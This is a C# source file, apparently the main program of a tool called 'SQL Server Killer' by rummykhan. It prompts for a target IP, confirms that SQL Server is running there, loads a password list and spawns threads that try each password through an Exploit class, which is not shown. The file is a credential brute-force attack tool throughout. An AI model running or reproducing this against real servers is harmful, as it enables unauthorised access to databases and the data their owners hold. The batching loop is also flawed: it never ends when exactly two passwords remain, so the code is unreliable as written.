using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;

namespace SQL_Server_Killer_v1
{
    class Program 
    {
        public static List<string> passwords = new List<string>();
        

        static void Main(string[] args)
        {
            Console.Title = "SQL Server Killer v2 by rummykhan";

            Console.Write("Enter Host IP : ");
            string ip = Console.ReadLine();
            Console.WriteLine("");

            if (GenericFunctions.checkNode(ip))
            {
                GenericFunctions.logNotification("Host is Live and running SQL Server..");

                passwords = GenericFunctions.getPasswordFromFile();

                if (passwords != null)
                {
                    if (passwords.Count > 0)
                    {
                        GenericFunctions.logNotification("Total passwords loaded are : " + passwords.Count);

                        List<string> topFewPasswords = new List<string>();
                        while (passwords.Count > 0)
                        {
                            if (passwords.Count - 5 > 0)
                            {
                                topFewPasswords = passwords.GetRange(0, 5);
                                passwords.RemoveRange(0, 5);
                                startThreads(ip, topFewPasswords);
                            }
                            else if (passwords.Count - 4 > 0)
                            {
                                topFewPasswords = passwords.GetRange(0, 4);
                                passwords.RemoveRange(0, 4);
                                startThreads(ip, topFewPasswords);
                            }
                            else if (passwords.Count - 3 > 0)
                            {
                                topFewPasswords = passwords.GetRange(0, 3);
                                passwords.RemoveRange(0, 3);
                                startThreads(ip, topFewPasswords);
                            }
                            else if (passwords.Count - 2 > 0)
                            {
                                topFewPasswords = passwords.GetRange(0, 2);
                                passwords.RemoveRange(0, 2);
                                startThreads(ip, topFewPasswords);
                            }
                            else if (passwords.Count == 1)
                            {
                                topFewPasswords = passwords.GetRange(0, 1);
                                passwords.RemoveRange(0, 1);
                                startThreads(ip, topFewPasswords);
                            }
                        }
                    }
                    else
                        GenericFunctions.logError("Password File is probably empty..!!");
                }

            }
            else
            {
                GenericFunctions.logError("Host is Dead..!!");
                GenericFunctions.logNotification("Press any key to exit..");
                Console.ReadKey();
            }

        }

        static void startThreads(string ip, List<string> topPasswords)
        {
            Exploit exploit = new Exploit();

            foreach (var password in topPasswords)
            {
                string[] ipAndPassword = { ip, password };
                Thread t = new Thread(new ParameterizedThreadStart(exploit.tryConnect));
                t.Start(ipAndPassword);
            }

        }
    }
}